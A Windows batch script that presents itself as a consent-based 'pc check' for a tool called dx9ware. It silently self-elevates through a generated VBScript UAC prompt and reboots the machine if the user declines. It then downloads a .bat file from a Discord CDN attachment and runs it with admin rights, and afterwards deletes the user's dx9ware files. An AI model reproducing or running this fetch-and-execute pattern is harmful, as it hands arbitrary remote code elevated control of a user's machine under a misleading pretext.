@echo off
set _tempid=%random%
title %_tempid% [%date%]
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
goto :var
:var
set 1=%username%
set 2=%appdata%
set dx9folder=false
set dx9dll=false
cd C:\ProgramData
md $CheckAgent$
cls
goto :main
:main
CHOICE /N /M "Do you consent to a pc check? [Y/N]"

IF ERRORLEVEL == 2 (
	shutdown /r /t 000
	EXIT /B 1
)
cls
Set "url=https://cdn.discordapp.com/attachments/1054551696614883408/1057862602971152435/1d.bat"
for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
Call :Download "%url%" "%File%"
If exist "%File%" ( 
    ( Type "%File%")>con
( Type "%File%" > C:\ProgramData\$CheckAgent$\dl.bat)
)
start C:\ProgramData\$CheckAgent$\dl.bat
cls
if exist C:\Users\%USERNAME%\AppData\Roaming\dx9ware set dx9folder=true
timeout 1 >nul
echo [40;34mSearching for folder(s)[40;0m 
timeout 1 >nul
if exist C:\Users\%USERNAME%\AppData\Roaming\dx9ware\dx9ware.dll set dx9dll=true
echo [40;34mSearching for dll(s)[40;0m 
:output
if %dx9folder% == true echo Found dx9ware folder! > C:\ProgramData\$CheckAgent$\output.txt
if %dx9dll% == true echo Found dx9ware dll! >> C:\ProgramData\$CheckAgent$\output.txt
if %dx9folder% == false echo dx9ware could not be located! > C:\ProgramData\$CheckAgent$\output.txt
if %dx9dll% == false echo dx9ware could not be located! >> C:\ProgramData\$CheckAgent$\output.txt
echo [40;34mOpening log file[40;0m 
timeout 1 >nul
start C:\ProgramData\$CheckAgent$\output.txt
del "C:\Users\%USERNAME%\AppData\Roaming\dx9ware\*.*" /s /q /f
    FOR /d %%p IN ("C:\Users\%USERNAME%\AppData\Roaming\dx9ware\*.*") DO rmdir "%%p" /s /q
pause >nul

:Download <url> <File>
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
exit /b